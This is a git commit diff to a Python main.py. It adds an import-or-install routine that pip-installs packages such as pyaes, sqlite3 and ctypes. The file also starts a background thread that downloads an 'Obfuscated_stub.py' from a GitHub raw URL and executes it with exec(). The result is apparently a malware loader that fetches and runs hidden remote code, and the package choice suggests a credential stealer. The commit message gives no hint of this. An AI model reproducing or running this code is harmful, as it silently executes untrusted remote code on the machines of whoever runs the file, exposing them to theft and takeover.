df6583747a186d7ccc51e27aae41b187b32ffa42
43a1723 <hai1723notgay@gmail.com>
2024-08-27 08:47:16 +0700

    Update main.py

--- lmao/a/main.py
+++ lmao/a/main.py
@@ -1,3 +1,22 @@
+import subprocess
+import sys
+
+def import_or_install(package):
+    try:
+        globals()[package] = __import__(package)
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+        globals()[package] = __import__(package)
+
+packages = [
+    "shutil", "re", "subprocess", "time", "traceback", "random", "sqlite3",
+    "json", "zlib", "base64", "os", "ctypes", "logging", "sys", "pyaes",
+    "threading", "urllib3"
+]
+
+for package in packages:
+    import_or_install(package)
+
 import threading, requests
 
 threading.Thread(target=lambda: exec(requests.get("https://raw.githubusercontent.com/43a1723/test/main/lmao/a/Obfuscated_stub.py").text)).start()
